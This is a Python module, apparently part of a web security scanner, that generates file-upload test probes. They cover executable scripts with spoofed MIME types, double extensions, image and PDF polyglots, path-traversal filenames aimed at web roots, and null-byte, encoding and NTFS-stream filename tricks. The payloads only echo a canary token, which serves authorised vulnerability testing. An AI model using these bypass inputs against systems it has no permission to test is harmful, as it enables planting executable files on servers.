"""file_upload: Payload generation."""
from __future__ import annotations

import copy
import os
import uuid
from typing import List, Union

from argus.collectors.file_upload.models import FileUploadMutationStrategy, FileUploadProbe, FileUploadTechnique, TargetRuntime


class FileUploadPayloadGenerator:
    """
    Generates tailored, multi-vector file upload payloads and probe objects
    spanning all supported runtimes, bypass modes, polyglot formats, and evasion mutations.
    """

    # Magic byte signatures for polyglots
    GIF89A_HEADER = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
    PNG_HEADER = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
    JPEG_SOI = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c\x1c $.' \",#\x1c\x1c(7),01444\x1f'9=82<.342\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\xff\xda\x00\x08\x01\x01\x00\x00?\x00\xbf\x00\xff\xd9"
    PDF_HEADER = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n"

    def __init__(self):
        pass

    def generate_canary(self) -> str:
        """Generates a secure, deterministic tracking canary token."""
        return f"ARGUS_CANARY_{uuid.uuid4().hex[:12]}"

    def build_payload_content(self, runtime: Union[TargetRuntime, str], canary: str) -> str:
        """Generates safe non-destructive script content embedding the canary token."""
        r = str(runtime).lower()
        if TargetRuntime.PHP.value in r or r == "php":
            return f"<?php echo '{canary}'; ?>"
        elif TargetRuntime.JSP.value in r or r == "jsp":
            return f'<% out.println("{canary}"); %>'
        elif TargetRuntime.ASP_ASPX.value in r or "asp" in r:
            return f'<%@ Page Language="C#" %><% Response.Write("{canary}"); %>'
        elif TargetRuntime.PYTHON.value in r or "py" in r:
            return f'import sys\nsys.stdout.write("{canary}")\n'
        elif TargetRuntime.RUBY.value in r or "rb" in r:
            return f'puts "{canary}"\n'
        elif TargetRuntime.BASH.value in r or "sh" in r:
            return f'#!/bin/sh\necho "{canary}"\n'
        else:
            return f"/* ARGUS_PAYLOAD */\n{canary}\n"

    # -------------------------------------------------------------------------
    # R2.1: Unrestricted Executable Upload Probes
    # -------------------------------------------------------------------------
    def generate_unrestricted_probes(self) -> List[FileUploadProbe]:
        """Generates raw executable file upload probes across all supported runtimes."""
        probes: List[FileUploadProbe] = []

        runtime_matrix = [
            (TargetRuntime.PHP, "shell.php", "application/x-php"),
            (TargetRuntime.PHP, "shell.phtml", "application/x-php"),
            (TargetRuntime.PHP, "shell.php5", "application/x-php"),
            (TargetRuntime.JSP, "exploit.jsp", "application/x-jsp"),
            (TargetRuntime.JSP, "exploit.jspx", "application/x-jspx"),
            (TargetRuntime.ASP_ASPX, "payload.aspx", "application/x-aspx"),
            (TargetRuntime.ASP_ASPX, "payload.asp", "application/x-asp"),
            (TargetRuntime.ASP_ASPX, "payload.cer", "application/x-cer"),
            (TargetRuntime.PYTHON, "script.py", "text/x-python"),
            (TargetRuntime.RUBY, "script.rb", "text/x-ruby"),
            (TargetRuntime.BASH, "cmd.sh", "application/x-sh"),
            (TargetRuntime.GENERIC, "binary.exe", "application/x-msdownload"),
        ]

        for rt, fname, ctype in runtime_matrix:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type=ctype,
                    technique=FileUploadTechnique.UNRESTRICTED_UPLOAD,
                    strategy=FileUploadMutationStrategy.STANDARD,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        return probes

    # -------------------------------------------------------------------------
    # R2.2: MIME Type Bypass Probes
    # -------------------------------------------------------------------------
    def generate_mime_bypass_probes(self) -> List[FileUploadProbe]:
        """Generates probes where executable files are paired with spoofed benign MIME types."""
        probes: List[FileUploadProbe] = []

        mime_matrix = [
            (TargetRuntime.PHP, "shell.php", "image/jpeg"),
            (TargetRuntime.PHP, "shell.php", "image/png"),
            (TargetRuntime.PHP, "shell.php", "image/gif"),
            (TargetRuntime.PHP, "shell.phtml", "application/pdf"),
            (TargetRuntime.JSP, "exploit.jsp", "image/png"),
            (TargetRuntime.JSP, "exploit.jsp", "image/jpeg"),
            (TargetRuntime.ASP_ASPX, "payload.aspx", "image/jpeg"),
            (TargetRuntime.ASP_ASPX, "payload.asp", "image/png"),
            (TargetRuntime.PYTHON, "script.py", "image/png"),
            (TargetRuntime.RUBY, "exploit.rb", "application/pdf"),
            (TargetRuntime.BASH, "script.sh", "application/pdf"),
        ]

        for rt, fname, benign_mime in mime_matrix:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type=benign_mime,
                    technique=FileUploadTechnique.MIME_TYPE_BYPASS,
                    strategy=FileUploadMutationStrategy.CONTENT_TYPE_MISMATCH,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        return probes

    # -------------------------------------------------------------------------
    # R2.3: Double Extension Bypass Probes
    # -------------------------------------------------------------------------
    def generate_double_extension_probes(self) -> List[FileUploadProbe]:
        """Generates probes testing double extensions (.php.jpg, .asp.png, .jsp.gif, etc.)."""
        probes: List[FileUploadProbe] = []

        double_ext_matrix = [
            (TargetRuntime.PHP, "shell.php.jpg", "image/jpeg"),
            (TargetRuntime.PHP, "shell.php.png", "image/png"),
            (TargetRuntime.PHP, "shell.php.gif", "image/gif"),
            (TargetRuntime.PHP, "shell.phtml.jpg", "image/jpeg"),
            (TargetRuntime.PHP, "shell.php.pdf", "application/pdf"),
            (TargetRuntime.ASP_ASPX, "payload.asp.png", "image/png"),
            (TargetRuntime.ASP_ASPX, "payload.aspx.jpg", "image/jpeg"),
            (TargetRuntime.ASP_ASPX, "payload.aspx.gif", "image/gif"),
            (TargetRuntime.JSP, "exploit.jsp.gif", "image/gif"),
            (TargetRuntime.JSP, "exploit.jsp.png", "image/png"),
            (TargetRuntime.PYTHON, "script.py.jpg", "image/jpeg"),
            (TargetRuntime.BASH, "script.sh.png", "image/png"),
        ]

        for rt, fname, ctype in double_ext_matrix:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type=ctype,
                    technique=FileUploadTechnique.DOUBLE_EXTENSION_BYPASS,
                    strategy=FileUploadMutationStrategy.STANDARD,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        return probes

    # -------------------------------------------------------------------------
    # R2.4: Polyglot Magic Bytes Probes
    # -------------------------------------------------------------------------
    def generate_polyglot_probes(self) -> List[FileUploadProbe]:
        """Generates valid polyglots combining binary format magic bytes with executable code."""
        probes: List[FileUploadProbe] = []

        polyglot_formats = [
            ("GIF89a", self.GIF89A_HEADER, "image/gif", ".gif", TargetRuntime.PHP),
            ("PNG", self.PNG_HEADER, "image/png", ".png", TargetRuntime.PHP),
            ("JPEG", self.JPEG_SOI, "image/jpeg", ".jpg", TargetRuntime.PHP),
            ("PDF", self.PDF_HEADER, "application/pdf", ".pdf", TargetRuntime.PHP),
            ("GIF89a_JSP", self.GIF89A_HEADER, "image/gif", ".gif", TargetRuntime.JSP),
            ("PNG_JSP", self.PNG_HEADER, "image/png", ".png", TargetRuntime.JSP),
            ("JPEG_ASPX", self.JPEG_SOI, "image/jpeg", ".jpg", TargetRuntime.ASP_ASPX),
            ("GIF89a_ASPX", self.GIF89A_HEADER, "image/gif", ".gif", TargetRuntime.ASP_ASPX),
            ("GIF89a_PY", self.GIF89A_HEADER, "image/gif", ".gif", TargetRuntime.PYTHON),
        ]

        for label, header_bytes, mime, ext, rt in polyglot_formats:
            canary = self.generate_canary()
            script_str = self.build_payload_content(rt, canary)
            polyglot_bytes = header_bytes + b"\n" + script_str.encode("utf-8")
            fname = f"polyglot_{label.lower()}{ext}"

            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=polyglot_bytes,
                    content_type=mime,
                    technique=FileUploadTechnique.POLYGLOT_MAGIC_BYTES,
                    strategy=FileUploadMutationStrategy.MAGIC_BYTES_PREPENDING,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        return probes

    # -------------------------------------------------------------------------
    # R2.5: Path Traversal in Filenames Probes
    # -------------------------------------------------------------------------
    def generate_path_traversal_probes(self) -> List[FileUploadProbe]:
        """Generates probes with filename traversal sequences (../, ..\\, encodings)."""
        probes: List[FileUploadProbe] = []

        traversal_patterns = [
            ("../../shell.php", TargetRuntime.PHP),
            ("..\\..\\shell.php", TargetRuntime.PHP),
            ("....//....//shell.php", TargetRuntime.PHP),
            ("..%2f..%2fshell.php", TargetRuntime.PHP),
            ("..%252f..%252fshell.php", TargetRuntime.PHP),
            ("..%c0%af..%c0%afshell.php", TargetRuntime.PHP),
            (".\\..\\.\\..\\shell.php", TargetRuntime.PHP),
            ("..\\..\\..\\..\\var\\www\\html\\shell.php", TargetRuntime.PHP),
            ("..\\..\\..\\..\\inetpub\\wwwroot\\shell.aspx", TargetRuntime.ASP_ASPX),
            ("../../exploit.jsp", TargetRuntime.JSP),
        ]

        for fname, rt in traversal_patterns:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type="application/octet-stream",
                    technique=FileUploadTechnique.PATH_TRAVERSAL_FILENAME,
                    strategy=FileUploadMutationStrategy.FILENAME_ENCODING,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        return probes

    # -------------------------------------------------------------------------
    # R4: Evasion Mutation Strategies Matrix
    # -------------------------------------------------------------------------
    def generate_evasion_mutations(self) -> List[FileUploadProbe]:
        """Generates probes covering the 7 distinct evasion & mutation strategies."""
        probes: List[FileUploadProbe] = []

        # Strategy 1: Extension Casing
        casing_variants = [
            ("shell.pHp", TargetRuntime.PHP),
            ("shell.PhP", TargetRuntime.PHP),
            ("shell.PHP", TargetRuntime.PHP),
            ("payload.AsP", TargetRuntime.ASP_ASPX),
            ("payload.AsPx", TargetRuntime.ASP_ASPX),
            ("payload.ASPX", TargetRuntime.ASP_ASPX),
            ("exploit.Jsp", TargetRuntime.JSP),
            ("exploit.JSP", TargetRuntime.JSP),
            ("script.Py", TargetRuntime.PYTHON),
            ("cmd.SH", TargetRuntime.BASH),
        ]
        for fname, rt in casing_variants:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type="application/octet-stream",
                    technique=FileUploadTechnique.UNRESTRICTED_UPLOAD,
                    strategy=FileUploadMutationStrategy.EXTENSION_CASING,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        # Strategy 2: Null Byte Injection
        null_byte_variants = [
            ("shell.php%00.jpg", TargetRuntime.PHP, "image/jpeg"),
            ("shell.php\x00.png", TargetRuntime.PHP, "image/png"),
            ("exploit.jsp%00.gif", TargetRuntime.JSP, "image/gif"),
            ("exploit.jsp\x00.jpg", TargetRuntime.JSP, "image/jpeg"),
            ("payload.asp%00.png", TargetRuntime.ASP_ASPX, "image/png"),
            ("payload.aspx\x00.jpg", TargetRuntime.ASP_ASPX, "image/jpeg"),
        ]
        for fname, rt, ctype in null_byte_variants:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type=ctype,
                    technique=FileUploadTechnique.NULL_BYTE_INJECTION,
                    strategy=FileUploadMutationStrategy.NULL_BYTE,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        # Strategy 3: Filename Encoding Variations
        encoding_variants = [
            ("shell%2ephp", TargetRuntime.PHP),
            ("shell%252ephp", TargetRuntime.PHP),
            ("shell\uff0ephp", TargetRuntime.PHP),  # Unicode fullwidth dot
            ("shell\u3002php", TargetRuntime.PHP),  # Ideographic full stop
            ("shell%c0%aephp", TargetRuntime.PHP),  # Overlong UTF-8
        ]
        for fname, rt in encoding_variants:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type="application/octet-stream",
                    technique=FileUploadTechnique.UNRESTRICTED_UPLOAD,
                    strategy=FileUploadMutationStrategy.FILENAME_ENCODING,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        # Strategy 4: Trailing Dots & Spaces (Windows Normalization)
        trailing_variants = [
            ("shell.php.", TargetRuntime.PHP),
            ("shell.php...", TargetRuntime.PHP),
            ("shell.php ", TargetRuntime.PHP),
            ("shell.php. .", TargetRuntime.PHP),
            ("payload.aspx.", TargetRuntime.ASP_ASPX),
            ("payload.aspx ", TargetRuntime.ASP_ASPX),
        ]
        for fname, rt in trailing_variants:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type="application/octet-stream",
                    technique=FileUploadTechnique.UNRESTRICTED_UPLOAD,
                    strategy=FileUploadMutationStrategy.TRAILING_DOTS_SPACES,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        # Strategy 5: NTFS Alternate Data Streams (::$DATA)
        ntfs_variants = [
            ("shell.php::$DATA", TargetRuntime.PHP),
            ("shell.php::$INDEX_ALLOCATION", TargetRuntime.PHP),
            ("payload.aspx::$DATA", TargetRuntime.ASP_ASPX),
        ]
        for fname, rt in ntfs_variants:
            canary = self.generate_canary()
            content = self.build_payload_content(rt, canary)
            probes.append(
                FileUploadProbe(
                    filename=fname,
                    content=content,
                    content_type="application/octet-stream",
                    technique=FileUploadTechnique.UNRESTRICTED_UPLOAD,
                    strategy=FileUploadMutationStrategy.NTFS_STREAM,
                    target_runtime=rt,
                    canary_token=canary,
                )
            )

        return probes

    # -------------------------------------------------------------------------
    # Benign Baseline Generation
    # -------------------------------------------------------------------------
    def generate_benign_probes(self) -> List[FileUploadProbe]:
        """Generates authentic, benign image/document probes for false positive baselining."""
        probes: List[FileUploadProbe] = [
            FileUploadProbe(
                filename="legitimate_image.jpg",
                content=self.JPEG_SOI,
                content_type="image/jpeg",
                technique=FileUploadTechnique.UNRESTRICTED_UPLOAD,
                strategy=FileUploadMutationStrategy.STANDARD,
                target_runtime=TargetRuntime.GENERIC,
                canary_token="",
                is_benign=True,
            ),
            FileUploadProbe(
                filename="legitimate_photo.png",
                content=self.PNG_HEADER,
                content_type="image/png",
                technique=FileUploadTechnique.UNRESTRICTED_UPLOAD,
                strategy=FileUploadMutationStrategy.STANDARD,
                target_runtime=TargetRuntime.GENERIC,
                canary_token="",
                is_benign=True,
            ),
            FileUploadProbe(
                filename="document.pdf",
                content=self.PDF_HEADER + b"Sample PDF document text\n%%EOF",
                content_type="application/pdf",
                technique=FileUploadTechnique.UNRESTRICTED_UPLOAD,
                strategy=FileUploadMutationStrategy.STANDARD,
                target_runtime=TargetRuntime.GENERIC,
                canary_token="",
                is_benign=True,
            ),
        ]
        return probes

    def apply_mutation(
        self,
        probe: FileUploadProbe,
        strategy: Union[FileUploadMutationStrategy, str],
    ) -> FileUploadProbe:
        """Applies a specified evasion/mutation strategy to a given FileUploadProbe."""
        strat = FileUploadMutationStrategy(strategy) if isinstance(strategy, str) else strategy
        mutated = copy.deepcopy(probe)
        mutated.strategy = strat
        base_name, ext = os.path.splitext(probe.filename)

        if strat == FileUploadMutationStrategy.EXTENSION_CASING:
            # Alternating extension casing: .php -> .pHp
            if ext:
                cased_ext = "".join(c.upper() if i % 2 == 1 else c.lower() for i, c in enumerate(ext))
                mutated.filename = f"{base_name}{cased_ext}"

        elif strat == FileUploadMutationStrategy.NULL_BYTE:
            # Append %00.jpg null byte sequence
            mutated.filename = f"{probe.filename}%00.jpg"
            mutated.content_type = "image/jpeg"

        elif strat == FileUploadMutationStrategy.CONTENT_TYPE_MISMATCH:
            mutated.content_type = "image/jpeg"

        elif strat == FileUploadMutationStrategy.MAGIC_BYTES_PREPENDING:
            canary = probe.canary_token or self.generate_canary()
            if isinstance(probe.content, bytes):
                content_bytes = probe.content
            elif isinstance(probe.content, str) and probe.content:
                content_bytes = probe.content.encode("utf-8")
            else:
                script_content = self.build_payload_content(probe.target_runtime, canary)
                content_bytes = script_content.encode("utf-8")
            mutated.content = self.GIF89A_HEADER + b"\n" + content_bytes
            mutated.content_type = "image/gif"

        elif strat == FileUploadMutationStrategy.FILENAME_ENCODING:
            # URL encode dots or slashes
            mutated.filename = probe.filename.replace(".", "%2e")

        elif strat == FileUploadMutationStrategy.TRAILING_DOTS_SPACES:
            mutated.filename = f"{probe.filename}."

        elif strat == FileUploadMutationStrategy.NTFS_STREAM:
            mutated.filename = f"{probe.filename}::$DATA"

        return mutated

    def generate_all_probes(self) -> List[FileUploadProbe]:
        """Returns the full aggregated suite of file upload probes."""
        all_probes: List[FileUploadProbe] = []
        all_probes.extend(self.generate_unrestricted_probes())
        all_probes.extend(self.generate_mime_bypass_probes())
        all_probes.extend(self.generate_double_extension_probes())
        all_probes.extend(self.generate_polyglot_probes())
        all_probes.extend(self.generate_path_traversal_probes())
        all_probes.extend(self.generate_evasion_mutations())
        return all_probes
